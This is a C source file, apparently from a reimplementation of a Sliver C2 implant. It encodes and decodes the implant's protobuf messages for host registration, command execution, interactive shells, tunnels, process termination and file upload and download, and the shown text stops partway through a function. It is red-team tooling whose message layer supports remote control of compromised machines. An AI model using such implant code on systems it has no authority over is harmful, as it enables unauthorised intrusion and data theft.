/* src/proto/proto.c - minimal protobuf writer/reader and Sliver messages. */
#include "sliver/proto.h"

#include <stdlib.h>
#include <string.h>

static int encode_response(sliver_buf_t *out, const char *err);

static int buf_reserve(sliver_buf_t *b, size_t extra) {
  size_t need;
  uint8_t *grown;
  if (b->failed) {
    return -1;
  }
  need = b->len + extra;
  if (need <= b->cap) {
    return 0;
  }
  {
    size_t cap = b->cap == 0 ? 128 : b->cap;
    while (cap < need) {
      cap *= 2;
    }
    grown = (uint8_t *)realloc(b->data, cap);
    if (grown == NULL) {
      b->failed = 1;
      return -1;
    }
    b->data = grown;
    b->cap = cap;
  }
  return 0;
}

void sliver_buf_init(sliver_buf_t *b) {
  if (b != NULL) {
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
    b->failed = 0;
  }
}

void sliver_buf_free(sliver_buf_t *b) {
  if (b != NULL) {
    free(b->data);
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
  }
}

int sliver_buf_append(sliver_buf_t *b, const void *data, size_t len) {
  if (b == NULL || (data == NULL && len != 0)) {
    return -1;
  }
  if (len == 0) {
    return 0;
  }
  if (buf_reserve(b, len) != 0) {
    return -1;
  }
  memcpy(b->data + b->len, data, len);
  b->len += len;
  return 0;
}

int sliver_buf_put_varint(sliver_buf_t *b, uint64_t value) {
  uint8_t tmp[10];
  size_t n = 0;
  do {
    uint8_t byte = (uint8_t)(value & 0x7f);
    value >>= 7;
    if (value != 0) {
      byte |= 0x80;
    }
    tmp[n++] = byte;
  } while (value != 0);
  if (buf_reserve(b, n) != 0) {
    return -1;
  }
  memcpy(b->data + b->len, tmp, n);
  b->len += n;
  return 0;
}

int sliver_buf_put_tag(sliver_buf_t *b, uint32_t field, uint32_t wire_type) {
  return sliver_buf_put_varint(b, ((uint64_t)field << 3) | (wire_type & 7));
}

int sliver_buf_put_bytes(sliver_buf_t *b, uint32_t field, const void *data, size_t len) {
  if (sliver_buf_put_tag(b, field, 2) != 0 || sliver_buf_put_varint(b, len) != 0) {
    return -1;
  }
  if (len == 0) {
    return 0;
  }
  if (buf_reserve(b, len) != 0) {
    return -1;
  }
  memcpy(b->data + b->len, data, len);
  b->len += len;
  return 0;
}

int sliver_buf_put_string(sliver_buf_t *b, uint32_t field, const char *s) {
  if (s == NULL || s[0] == '\0') {
    return 0; /* proto3 omits default values */
  }
  return sliver_buf_put_bytes(b, field, s, strlen(s));
}

int sliver_buf_put_uint64(sliver_buf_t *b, uint32_t field, uint64_t value) {
  if (value == 0) {
    return 0;
  }
  return sliver_buf_put_tag(b, field, 0) == 0 && sliver_buf_put_varint(b, value) == 0 ? 0 : -1;
}

int sliver_buf_put_uint32(sliver_buf_t *b, uint32_t field, uint32_t value) {
  return sliver_buf_put_uint64(b, field, value);
}

int sliver_buf_put_int64(sliver_buf_t *b, uint32_t field, int64_t value) {
  /* proto3 int64: two's complement varint (negatives take 10 bytes). */
  return sliver_buf_put_uint64(b, field, (uint64_t)value);
}

int sliver_buf_put_int32(sliver_buf_t *b, uint32_t field, int32_t value) {
  return sliver_buf_put_uint64(b, field, (uint64_t)(int64_t)value);
}

int sliver_buf_put_bool(sliver_buf_t *b, uint32_t field, int value) {
  if (!value) {
    return 0;
  }
  return sliver_buf_put_tag(b, field, 0) == 0 && sliver_buf_put_varint(b, 1) == 0 ? 0 : -1;
}

void sliver_reader_init(sliver_reader_t *r, const void *data, size_t len) {
  r->data = (const uint8_t *)data;
  r->len = len;
  r->pos = 0;
  r->failed = 0;
}

int sliver_reader_varint(sliver_reader_t *r, uint64_t *value) {
  uint64_t result = 0;
  int shift = 0;
  while (r->pos < r->len && shift < 64) {
    uint8_t byte = r->data[r->pos++];
    result |= (uint64_t)(byte & 0x7f) << shift;
    if ((byte & 0x80) == 0) {
      *value = result;
      return 0;
    }
    shift += 7;
  }
  r->failed = 1;
  return -1;
}

int sliver_reader_next(sliver_reader_t *r, uint32_t *field, uint32_t *wire_type) {
  uint64_t key;
  if (r->failed || r->pos >= r->len) {
    return 1; /* end of message */
  }
  if (sliver_reader_varint(r, &key) != 0) {
    return -1;
  }
  *field = (uint32_t)(key >> 3);
  *wire_type = (uint32_t)(key & 7);
  return 0;
}

int sliver_reader_bytes(sliver_reader_t *r, const uint8_t **data, size_t *len) {
  uint64_t n;
  if (sliver_reader_varint(r, &n) != 0 || n > (uint64_t)(r->len - r->pos)) {
    r->failed = 1;
    return -1;
  }
  *data = r->data + r->pos;
  *len = (size_t)n;
  r->pos += (size_t)n;
  return 0;
}

int sliver_reader_string(sliver_reader_t *r, char *out, size_t cap) {
  const uint8_t *data;
  size_t len;

  if (out == NULL || cap == 0) {
    return -1;
  }
  if (sliver_reader_bytes(r, &data, &len) != 0) {
    return -1;
  }
  if (len >= cap) {
    /* Never truncate silently: a shortened path would delete/write the wrong
     * file instead of reporting a protocol error. */
    out[0] = 0;
    r->failed = 1;
    return -1;
  }
  if (len != 0) {
    memcpy(out, data, len);
  }
  out[len] = 0;
  return 0;
}

int sliver_reader_skip(sliver_reader_t *r, uint32_t wire_type) {
  switch (wire_type) {
    case 0: { /* varint */
      uint64_t v;
      return sliver_reader_varint(r, &v);
    }
    case 1: /* fixed64 */
      if (r->len - r->pos < 8) {
        r->failed = 1;
        return -1;
      }
      r->pos += 8;
      return 0;
    case 2: { /* length delimited */
      const uint8_t *d;
      size_t l;
      return sliver_reader_bytes(r, &d, &l);
    }
    case 5: /* fixed32 */
      if (r->len - r->pos < 4) {
        r->failed = 1;
        return -1;
      }
      r->pos += 4;
      return 0;
    default:
      r->failed = 1;
      return -1;
  }
}

int sliver_envelope_encode(sliver_buf_t *out, int64_t id, uint32_t type,
                           const void *data, size_t data_len) {
  if (sliver_buf_put_int64(out, 1, id) != 0) {
    return -1;
  }
  if (sliver_buf_put_uint32(out, 2, type) != 0) {
    return -1;
  }
  if (data != NULL && data_len != 0 && sliver_buf_put_bytes(out, 3, data, data_len) != 0) {
    return -1;
  }
  return out->failed ? -1 : 0;
}

int sliver_envelope_decode(const void *data, size_t len, sliver_envelope_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;
  if (data == NULL || out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    switch (field) {
      case 1: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) {
          return -1;
        }
        out->id = (int64_t)v;
        break;
      }
      case 2: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) {
          return -1;
        }
        out->type = (uint32_t)v;
        break;
      }
      case 3: {
        const uint8_t *d = NULL;
        size_t l = 0;
        if (wire != 2 || sliver_reader_bytes(&r, &d, &l) != 0) {
          return -1;
        }
        out->data = d;
        out->data_len = l;
        break;
      }
      case 4: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) {
          return -1;
        }
        out->unknown_message_type = v != 0;
        break;
      }
      default:
        if (sliver_reader_skip(&r, wire) != 0) {
          return -1;
        }
        break;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_register_encode(sliver_buf_t *out, const sliver_register_t *reg) {
  if (reg == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, reg->name) != 0 ||
      sliver_buf_put_string(out, 2, reg->hostname) != 0 ||
      sliver_buf_put_string(out, 3, reg->uuid) != 0 ||
      sliver_buf_put_string(out, 4, reg->username) != 0 ||
      sliver_buf_put_string(out, 5, reg->uid) != 0 ||
      sliver_buf_put_string(out, 6, reg->gid) != 0 ||
      sliver_buf_put_string(out, 7, reg->os) != 0 ||
      sliver_buf_put_string(out, 8, reg->arch) != 0 ||
      sliver_buf_put_int32(out, 9, reg->pid) != 0 ||
      sliver_buf_put_string(out, 10, reg->filename) != 0 ||
      sliver_buf_put_string(out, 11, reg->active_c2) != 0 ||
      sliver_buf_put_string(out, 12, reg->version) != 0 ||
      sliver_buf_put_int64(out, 13, reg->reconnect_interval) != 0 ||
      sliver_buf_put_string(out, 14, reg->proxy_url) != 0 ||
      sliver_buf_put_string(out, 16, reg->config_id) != 0 ||
      sliver_buf_put_int64(out, 17, reg->peer_id) != 0 ||
      sliver_buf_put_string(out, 18, reg->locale) != 0 ||
      sliver_buf_put_uint64(out, 19, reg->capabilities) != 0) {
    return -1;
  }
  return out->failed ? -1 : 0;
}

int sliver_register_decode(const void *data, size_t len, sliver_register_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;
  if (data == NULL || out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    switch (field) {
      case 1: if (sliver_reader_string(&r, out->name, sizeof(out->name)) != 0) return -1; break;
      case 2: if (sliver_reader_string(&r, out->hostname, sizeof(out->hostname)) != 0) return -1; break;
      case 3: if (sliver_reader_string(&r, out->uuid, sizeof(out->uuid)) != 0) return -1; break;
      case 4: if (sliver_reader_string(&r, out->username, sizeof(out->username)) != 0) return -1; break;
      case 5: if (sliver_reader_string(&r, out->uid, sizeof(out->uid)) != 0) return -1; break;
      case 6: if (sliver_reader_string(&r, out->gid, sizeof(out->gid)) != 0) return -1; break;
      case 7: if (sliver_reader_string(&r, out->os, sizeof(out->os)) != 0) return -1; break;
      case 8: if (sliver_reader_string(&r, out->arch, sizeof(out->arch)) != 0) return -1; break;
      case 9: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->pid = (int32_t)v;
        break;
      }
      case 10: if (sliver_reader_string(&r, out->filename, sizeof(out->filename)) != 0) return -1; break;
      case 11: if (sliver_reader_string(&r, out->active_c2, sizeof(out->active_c2)) != 0) return -1; break;
      case 12: if (sliver_reader_string(&r, out->version, sizeof(out->version)) != 0) return -1; break;
      case 13: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->reconnect_interval = (int64_t)v;
        break;
      }
      case 14: if (sliver_reader_string(&r, out->proxy_url, sizeof(out->proxy_url)) != 0) return -1; break;
      case 16: if (sliver_reader_string(&r, out->config_id, sizeof(out->config_id)) != 0) return -1; break;
      case 17: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->peer_id = (int64_t)v;
        break;
      }
      case 18: if (sliver_reader_string(&r, out->locale, sizeof(out->locale)) != 0) return -1; break;
      case 19: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->capabilities = v;
        break;
      }
      default:
        if (sliver_reader_skip(&r, wire) != 0) return -1;
        break;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_ping_encode(sliver_buf_t *out, int32_t nonce) {
  return sliver_buf_put_int32(out, 1, nonce);
}

int sliver_ping_decode_nonce(const void *data, size_t len, int32_t *nonce) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;
  if (data == NULL || nonce == NULL) {
    return -1;
  }
  *nonce = 0;
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      *nonce = (int32_t)v;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

/* --- Ls / Pwd (P1.1) ---------------------------------------------------- */

int sliver_request_field(const void *data, size_t len, const uint8_t **out, size_t *out_len) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (out == NULL || out_len == NULL) {
    return -1;
  }
  *out = NULL;
  *out_len = 0;
  if (data == NULL) {
    return 0;
  }
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 9 && wire == 2) {
      const uint8_t *p;
      size_t n;
      if (sliver_reader_bytes(&r, &p, &n) != 0) {
        return -1;
      }
      *out = p;
      *out_len = n;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_ls_req_decode(const void *data, size_t len, char *path, size_t cap) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (path == NULL || cap == 0) {
    return -1;
  }
  path[0] = '\0';
  if (data == NULL) {
    return 0;
  }
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, path, cap) != 0) {
        return -1;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

static int encode_file_info(sliver_buf_t *out, const sliver_file_info_t *f) {
  sliver_buf_t entry;
  int rc = -1;

  sliver_buf_init(&entry);
  if (sliver_buf_put_string(&entry, 1, f->name) != 0 ||
      sliver_buf_put_bool(&entry, 2, f->is_dir) != 0 ||
      sliver_buf_put_int64(&entry, 3, f->size) != 0 ||
      sliver_buf_put_int64(&entry, 4, f->mtime) != 0 ||
      sliver_buf_put_string(&entry, 5, f->mode) != 0 ||
      (f->link[0] != '\0' && sliver_buf_put_string(&entry, 6, f->link) != 0) ||
      (f->uid[0] != '\0' && sliver_buf_put_string(&entry, 7, f->uid) != 0) ||
      (f->gid[0] != '\0' && sliver_buf_put_string(&entry, 8, f->gid) != 0)) {
    goto out;
  }
  rc = sliver_buf_put_bytes(out, 3, entry.data, entry.len);
out:
  sliver_buf_free(&entry);
  return rc;
}

int sliver_ls_encode(sliver_buf_t *out, const char *path, int exists,
                     const sliver_file_info_t *files, size_t count) {
  size_t i;

  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, path != NULL ? path : "") != 0) {
    return -1;
  }
  if (exists && sliver_buf_put_bool(out, 2, 1) != 0) {
    return -1;
  }
  for (i = 0; i < count; ++i) {
    if (encode_file_info(out, &files[i]) != 0) {
      return -1;
    }
  }
  /* Empty commonpb.Response keeps the client-side GetResponse() non-nil. */
  if (sliver_buf_put_tag(out, 9, 2) != 0 || sliver_buf_put_varint(out, 0) != 0) {
    return -1;
  }
  return 0;
}

int sliver_pwd_encode(sliver_buf_t *out, const char *path, const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, path != NULL ? path : "") != 0) {
    return -1;
  }
  return encode_response(out, err);
}


/* --- path requests (Cd / Rm / Mkdir) ------------------------------------ */

int sliver_path_req_decode(const void *data, size_t len, sliver_path_req_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  if (data == NULL) {
    return 0;
  }
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, out->path, sizeof(out->path)) != 0) {
        return -1;
      }
    } else if (field == 2 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      out->recursive = v != 0;
    } else if (field == 3 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      out->force = v != 0;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

static int encode_response(sliver_buf_t *out, const char *err) {
  sliver_buf_t resp;
  int rc;

  if (err == NULL || err[0] == '\0') {
    return sliver_buf_put_tag(out, 9, 2) == 0 && sliver_buf_put_varint(out, 0) == 0 ? 0 : -1;
  }
  sliver_buf_init(&resp);
  if (sliver_buf_put_string(&resp, 1, err) != 0) {
    sliver_buf_free(&resp);
    return -1;
  }
  rc = sliver_buf_put_bytes(out, 9, resp.data, resp.len);
  sliver_buf_free(&resp);
  return rc;
}

int sliver_path_resp_encode(sliver_buf_t *out, const char *path, const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, path != NULL ? path : "") != 0) {
    return -1;
  }
  return encode_response(out, err);
}

/* --- Ps / Terminate ---------------------------------------------------- */

int sliver_ps_encode(sliver_buf_t *out, const sliver_proc_info_t *procs, size_t count,
                     const char *err) {
  size_t i;

  if (out == NULL) {
    return -1;
  }
  for (i = 0; i < count; ++i) {
    sliver_buf_t entry;
    int rc;
    sliver_buf_init(&entry);
    if (sliver_buf_put_int32(&entry, 1, procs[i].pid) != 0 ||
        sliver_buf_put_int32(&entry, 2, procs[i].ppid) != 0 ||
        sliver_buf_put_string(&entry, 3, procs[i].exe != NULL ? procs[i].exe : "") != 0 ||
        (procs[i].owner != NULL && procs[i].owner[0] != '\0' &&
         sliver_buf_put_string(&entry, 4, procs[i].owner) != 0) ||
        (procs[i].session_id != 0 && sliver_buf_put_int32(&entry, 5, procs[i].session_id) != 0) ||
        (procs[i].cmdline != NULL && procs[i].cmdline[0] != '\0' &&
         sliver_buf_put_string(&entry, 6, procs[i].cmdline) != 0) ||
        (procs[i].arch != NULL && procs[i].arch[0] != '\0' &&
         sliver_buf_put_string(&entry, 7, procs[i].arch) != 0)) {
      sliver_buf_free(&entry);
      return -1;
    }
    rc = sliver_buf_put_bytes(out, 1, entry.data, entry.len);
    sliver_buf_free(&entry);
    if (rc != 0) {
      return -1;
    }
  }
  return encode_response(out, err);
}

int sliver_terminate_req_decode(const void *data, size_t len, int32_t *pid, int *force) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (pid == NULL) {
    return -1;
  }
  *pid = 0;
  if (force != NULL) {
    *force = 0;
  }
  if (data == NULL) {
    return 0;
  }
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      *pid = (int32_t)v;
    } else if (field == 2 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      if (force != NULL) {
        *force = v != 0;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_terminate_encode(sliver_buf_t *out, int32_t pid, const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_int32(out, 1, pid) != 0) {
    return -1;
  }
  return encode_response(out, err);
}

/* --- Env --------------------------------------------------------------- */

int sliver_env_encode(sliver_buf_t *out, const sliver_env_pair_t *vars, size_t count,
                      const char *err) {
  size_t i;

  if (out == NULL) {
    return -1;
  }
  for (i = 0; i < count; ++i) {
    sliver_buf_t entry;
    int rc;
    sliver_buf_init(&entry);
    if (sliver_buf_put_string(&entry, 1, vars[i].key != NULL ? vars[i].key : "") != 0 ||
        sliver_buf_put_string(&entry, 2, vars[i].value != NULL ? vars[i].value : "") != 0) {
      sliver_buf_free(&entry);
      return -1;
    }
    rc = sliver_buf_put_bytes(out, 1, entry.data, entry.len);
    sliver_buf_free(&entry);
    if (rc != 0) {
      return -1;
    }
  }
  return encode_response(out, err);
}




/* --- Download / Upload -------------------------------------------------- */

int sliver_download_req_decode(const void *data, size_t len, sliver_download_req_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, out->path, sizeof(out->path)) != 0) {
        return -1;
      }
    } else if (wire == 0 && (field == 2 || field == 3 || field == 5 || field == 6 || field == 4)) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      if (field == 2) {
        out->start = (int64_t)v;
      } else if (field == 3) {
        out->stop = (int64_t)v;
      } else if (field == 4) {
        out->recursive = v != 0;
      } else if (field == 5) {
        out->max_bytes = (int64_t)v;
      } else {
        out->max_lines = (int64_t)v;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_download_encode(sliver_buf_t *out, const char *path, int exists, int64_t start,
                           int64_t stop, const void *data, size_t data_len, int is_dir,
                           const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, path != NULL ? path : "") != 0) {
    return -1;
  }
  if (exists && sliver_buf_put_bool(out, 3, 1) != 0) {
    return -1;
  }
  if (start != 0 && sliver_buf_put_int64(out, 4, start) != 0) {
    return -1;
  }
  if (stop != 0 && sliver_buf_put_int64(out, 5, stop) != 0) {
    return -1;
  }
  if (data != NULL && data_len != 0 && sliver_buf_put_bytes(out, 6, data, data_len) != 0) {
    return -1;
  }
  if (is_dir && sliver_buf_put_bool(out, 7, 1) != 0) {
    return -1;
  }
  return encode_response(out, err);
}

int sliver_upload_req_decode(const void *data, size_t len, sliver_upload_req_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, out->path, sizeof(out->path)) != 0) {
        return -1;
      }
    } else if (field == 3 && wire == 2) {
      const uint8_t *p;
      size_t n;
      if (sliver_reader_bytes(&r, &p, &n) != 0) {
        return -1;
      }
      out->data = p;
      out->data_len = n;
    } else if (field == 5 && wire == 2) {
      if (sliver_reader_string(&r, out->file_name, sizeof(out->file_name)) != 0) {
        return -1;
      }
    } else if (field == 7 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      out->overwrite = v != 0;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_upload_encode(sliver_buf_t *out, const char *path, int written, int failed,
                         const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, path != NULL ? path : "") != 0) {
    return -1;
  }
  if (sliver_buf_put_int32(out, 2, written) != 0) {
    return -1;
  }
  if (failed != 0 && sliver_buf_put_int32(out, 3, failed) != 0) {
    return -1;
  }
  return encode_response(out, err);
}

/* --- Execute ------------------------------------------------------------ */

int sliver_execute_req_decode(const void *data, size_t len, sliver_execute_req_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, out->path, sizeof(out->path)) != 0) {
        return -1;
      }
    } else if (field == 2 && wire == 2 && out->argc < SLIVER_EXEC_MAX_ARGS) {
      if (sliver_reader_string(&r, out->args[out->argc], sizeof(out->args[0])) != 0) {
        return -1;
      }
      out->argc++;
    } else if (field == 3 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      out->output = v != 0;
    } else if (field == 8 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      out->background = v != 0;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout_data,
                          size_t stdout_len, const void *stderr_data, size_t stderr_len,
                          uint32_t pid, const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_uint32(out, 1, status) != 0) {
    return -1;
  }
  if (stdout_data != NULL && stdout_len != 0 &&
      sliver_buf_put_bytes(out, 2, stdout_data, stdout_len) != 0) {
    return -1;
  }
  if (stderr_data != NULL && stderr_len != 0 &&
      sliver_buf_put_bytes(out, 3, stderr_data, stderr_len) != 0) {
    return -1;
  }
  if (pid != 0 && sliver_buf_put_uint32(out, 4, pid) != 0) {
    return -1;
  }
  return encode_response(out, err);
}

/* --- Shell / Tunnel ----------------------------------------------------- */

int sliver_shell_req_decode(const void *data, size_t len, sliver_shell_req_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, out->path, sizeof(out->path)) != 0) {
        return -1;
      }
    } else if (wire == 0 && (field == 2 || field == 3 || field == 4 || field == 5 || field == 8)) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      if (field == 2) {
        out->enable_pty = v != 0;
      } else if (field == 3) {
        out->pid = (uint32_t)v;
      } else if (field == 4) {
        out->rows = (uint32_t)v;
      } else if (field == 5) {
        out->cols = (uint32_t)v;
      } else {
        out->tunnel_id = v;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_shell_encode(sliver_buf_t *out, const char *path, int pty, uint32_t pid,
                        uint64_t tunnel_id, const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, path != NULL ? path : "") != 0) {
    return -1;
  }
  if (pty && sliver_buf_put_bool(out, 2, 1) != 0) {
    return -1;
  }
  if (sliver_buf_put_uint32(out, 3, pid) != 0) {
    return -1;
  }
  if (tunnel_id != 0 && sliver_buf_put_uint64(out, 8, tunnel_id) != 0) {
    return -1;
  }
  return encode_response(out, err);
}

int sliver_tunnel_data_decode(const void *data, size_t len, sliver_tunnel_data_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      const uint8_t *p;
      size_t n;
      if (sliver_reader_bytes(&r, &p, &n) != 0) {
        return -1;
      }
      out->data = p;
      out->data_len = n;
    } else if (wire == 0 && (field == 2 || field == 3 || field == 4 || field == 8)) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      if (field == 2) {
        out->closed = v != 0;
      } else if (field == 3) {
        out->sequence = v;
      } else if (field == 4) {
        out->ack = v;
      } else {
        out->tunnel_id = v;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_tunnel_data_encode(sliver_buf_t *out, const void *payload, size_t payload_len,
                              int closed, uint64_t sequence, uint64_t tunnel_id,
                              uint64_t ack) {
  if (out == NULL) {
    return -1;
  }
  if (payload != NULL && payload_len != 0 &&
      sliver_buf_put_bytes(out, 1, payload, payload_len) != 0) {
    return -1;
  }
  if (closed && sliver_buf_put_bool(out, 2, 1) != 0) {
    return -1;
  }
  if (sequence != 0 && sliver_buf_put_uint64(out, 3, sequence) != 0) {
    return -1;
  }
  if (ack != 0 && sliver_buf_put_uint64(out, 4, ack) != 0) {
    return -1;
  }
  return sliver_buf_put_uint64(out, 8, tunnel_id);
}


int sliver_tunnel_close_encode(sliver_buf_t *out, uint64_t terminal_sequence,
                               uint64_t tunnel_id) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_bool(out, 2, 1) != 0) {
    return -1;
  }
  if (terminal_sequence != 0 && sliver_buf_put_uint64(out, 3, terminal_sequence) != 0) {
    return -1;
  }
  return sliver_buf_put_uint64(out, 8, tunnel_id);
}

int sliver_tunnel_resend_encode(sliver_buf_t *out, uint64_t sequence, uint64_t tunnel_id,
                                uint64_t ack) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_bool(out, 5, 1) != 0) {
    return -1;
  }
  if (sequence != 0 && sliver_buf_put_uint64(out, 3, sequence) != 0) {
    return -1;
  }
  if (ack != 0 && sliver_buf_put_uint64(out, 4, ack) != 0) {
    return -1;
  }
  return sliver_buf_put_uint64(out, 8, tunnel_id);
}


/* CurrentTokenOwner{Output=1, Response=9} ? Windows `whoami` asks for the token
 * owner; answering keeps the command usable on the C implant. */
int sliver_current_token_owner_encode(sliver_buf_t *out, const char *who) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, who != NULL ? who : "") != 0) {
    return -1;
  }
  return sliver_buf_put_tag(out, 9, 2) == 0 && sliver_buf_put_varint(out, 0) == 0 ? 0 : -1;
}

/* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */

int sliver_src_dst_decode(const void *data, size_t len, char *src, size_t src_cap, char *dst,
                          size_t dst_cap) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;

  if (src == NULL || dst == NULL || src_cap == 0 || dst_cap == 0) {
    return -1;
  }
  src[0] = 0;
  dst[0] = 0;
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 2) {
      if (sliver_reader_string(&r, src, src_cap) != 0) {
        return -1;
      }
    } else if (field == 2 && wire == 2) {
      if (sliver_reader_string(&r, dst, dst_cap) != 0) {
        return -1;
      }
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_cp_encode(sliver_buf_t *out, const char *src, const char *dst, int64_t written,
                     const char *err) {
  if (out == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, src != NULL ? src : "") != 0 ||
      sliver_buf_put_string(out, 2, dst != NULL ? dst : "") != 0 ||
      sliver_buf_put_int64(out, 3, written) != 0) {
    return -1;
  }
  return encode_response(out, err);
